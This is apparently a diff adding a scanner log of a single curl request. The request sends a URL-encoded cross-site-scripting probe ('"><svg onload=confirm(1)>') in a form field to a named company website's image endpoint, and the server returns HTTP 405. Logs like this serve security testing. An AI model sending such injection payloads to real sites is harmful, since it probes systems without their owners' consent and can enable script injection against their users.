@@ -1,0 +1,11 @@
+# command: timeout 15 curl -s -m 13 -o - -w '\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d search=s5cd734bda80705%22%3E%3Csvg+onload%3Dconfirm%281%29%3E https://www.infinitycapital.bh/_next/image
+# exit_code: 0
+# ---
+
+Method not allowed
+
+INVALID_REQUEST_METHOD
+
+bom1::bhjg6-1790742021029-671ce04804d6
+
+HTTP_STATUS:405
